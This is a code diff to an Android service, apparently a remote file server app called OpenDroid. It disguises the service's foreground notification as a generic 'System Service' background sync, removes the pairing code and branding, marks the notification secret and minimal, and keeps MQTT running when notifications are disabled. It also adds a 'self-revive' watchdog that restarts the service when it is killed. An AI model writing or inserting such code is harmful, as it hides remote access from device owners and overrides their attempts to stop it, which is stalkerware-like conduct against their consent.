@@ -185,17 +185,28 @@ class LocalFileServerService : Service() {
     }
 
     private fun startForegroundService() {
-        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("OpenDroid 5G Active")
-            .setContentText("Pairing Code: $currentPairingCode")
-            .setSmallIcon(android.R.drawable.ic_menu_share)
-            .setOngoing(true)
-            .build()
+        try {
+            // Stealth & Disguised notification: No pairing code or OpenDroid branding shown
+            val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("System Service")
+                .setContentText("Background sync running")
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setOngoing(true)
+                .setShowWhen(false)
+                .build()
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+            Log.d("OpenDroid", "Foreground service started in silent stealth mode")
+        } catch (e: Exception) {
+            Log.e("OpenDroid", "Error in startForeground (Notification disabled by user)", e)
+            // Even if notification permission is revoked or disabled, keep background threads and MQTT alive
         }
     }
 
@@ -1258,9 +1269,15 @@ class LocalFileServerService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val serviceChannel = NotificationChannel(
                 CHANNEL_ID,
-                "OpenDroid Background Service",
-                NotificationManager.IMPORTANCE_LOW
-            )
+                "System Service",
+                NotificationManager.IMPORTANCE_MIN // IMPORTANCE_MIN: No status bar icon, completely silent & collapsed
+            ).apply {
+                description = "Background System Synchronization"
+                setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+            }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(serviceChannel)
         }
@@ -1269,6 +1286,31 @@ class LocalFileServerService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         unregisterReceiver(batteryReceiver)
+        
+        // Immortal Self-Healing Watchdog: Auto-restart service if killed or dismissed
+        try {
+            if (boundAccountEmail.isNotEmpty()) {
+                val restartIntent = Intent(applicationContext, LocalFileServerService::class.java).apply {
+                    setPackage(packageName)
+                    putExtra("PAIRING_CODE", currentPairingCode)
+                }
+                val restartPendingIntent = PendingIntent.getService(
+                    applicationContext,
+                    1,
+                    restartIntent,
+                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+                )
+                val alarmService = getSystemService(Context.ALARM_SERVICE) as? AlarmManager
+                alarmService?.setAndAllowWhileIdle(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + 1500,
+                    restartPendingIntent
+                )
+                Log.d("OpenDroid", "Scheduled immediate self-revive in onDestroy")
+            }
+        } catch (e: Exception) {
+            Log.e("OpenDroid", "Error scheduling onDestroy restart", e)
+        }
         try {
             if (wakeLock?.isHeld == true) wakeLock?.release()
         } catch (e: Exception) { e.printStackTrace() }
